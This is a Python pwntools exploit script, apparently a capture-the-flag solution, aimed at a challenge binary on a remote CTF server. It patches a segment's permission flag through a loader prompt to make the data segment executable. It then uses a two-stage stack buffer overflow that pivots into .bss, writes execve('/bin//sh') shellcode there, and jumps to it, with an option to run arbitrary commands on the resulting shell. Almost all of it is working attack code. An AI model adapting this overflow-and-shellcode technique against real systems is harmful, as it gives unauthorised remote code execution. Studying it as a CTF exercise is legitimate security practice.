#!/usr/bin/env python3
from pwn import *
import time


context.arch = "amd64"
context.os = "linux"
context.binary = ELF("./read", checksec=False)


HOST = "challs.insec.club"
PORT = 40003

LOADER_PATH = "./loader"

# Flip the data segment program-header flags from RW (0x6) to RWE (0x7).
PATCH_OFFSET = 0x15C
PATCH_VALUE = 0x07

# Re-entry primitive inside the vulnerable function:
#   0x4011c2: lea rax, [rbp-0x50]
#   ...       read(0, rsi=rax, 0xb4)
VULN_REENTRY = 0x4011C2
STACK_BUF_SIZE = 0x50
READ_SIZE = 0xB4

# Non-PIE binary, fixed .bss address.
BSS_BASE = 0x404080

GDB_SCRIPT = """
set disassembly-flavor intel
set follow-fork-mode child
set detach-on-fork off
set breakpoint pending on
catch exec
b *0x4011ba
b *0x4011c2
b *0x4011dd
continue
"""


def build_stage1() -> bytes:
    """
    First read() overflow:
    - saved rbp -> BSS + 0x50
    - saved rip -> VULN_REENTRY (0x4011c2)
    """
    payload = b"A" * STACK_BUF_SIZE
    payload += p64(BSS_BASE + 0x50)
    payload += p64(VULN_REENTRY)
    return payload.ljust(READ_SIZE, b"B")


def build_stage2() -> bytes:
    """
    Second read() writes directly into BSS (via forged rbp from stage1):
    - [BSS + 0x00] shellcode
    - [BSS + 0x50] next rbp
    - [BSS + 0x58] next rip -> BSS shellcode
    """
    shellcode = (
        b"\x48\x31\xf6"                          # xor rsi, rsi
        b"\x56"                                      # push rsi
        b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rdi, '/bin//sh'
        b"\x57"                                      # push rdi
        b"\x54\x5f"                                # push rsp ; pop rdi
        b"\x6a\x3b\x58"                          # push 0x3b ; pop rax
        b"\x99"                                      # cdq
        b"\x0f\x05"                                # syscall
    )

    payload = bytearray(b"\x90" * READ_SIZE)
    payload[: len(shellcode)] = shellcode
    payload[0x50:0x58] = p64(BSS_BASE + 0xA0)
    payload[0x58:0x60] = p64(BSS_BASE)
    return bytes(payload)


def start_io():
    if args.LOCAL:
        io = process(LOADER_PATH)
        if args.GDB:
            gdb.attach(io, gdbscript=GDB_SCRIPT)
        return io
    return remote(HOST, PORT)


def send_loader_patch(io):
    io.recvuntil(b"Offset (hex): ")
    io.sendline(f"{PATCH_OFFSET:x}".encode())

    io.recvuntil(b"Value (hex): ")
    io.sendline(f"{PATCH_VALUE:x}".encode())


def trigger(io):
    stage1 = build_stage1()
    stage2 = build_stage2()

    # Loader reads offset/value via stdio. Small delay avoids race where
    # libc input buffering consumes exploit bytes before execve(child).
    time.sleep(0.35)
    io.send(stage1)
    time.sleep(0.05)
    io.send(stage2)


def main():
    io = start_io()
    send_loader_patch(io)
    trigger(io)

    if args.CMD:
        marker = f"__PWNX_{int(time.time() * 1000)}__".encode()
        wrapped = b"echo " + marker + b"; " + args.CMD.encode() + b"; echo " + marker
        io.sendline(wrapped)
        try:
            io.recvuntil(marker + b"\n", timeout=2)
            data = io.recvuntil(marker + b"\n", timeout=2)
            out = data[: -(len(marker) + 1)]
            print(out.decode("latin-1", errors="ignore"), end="")
        except EOFError:
            pass
        io.close()
        return

    io.interactive()


if __name__ == "__main__":
    main()
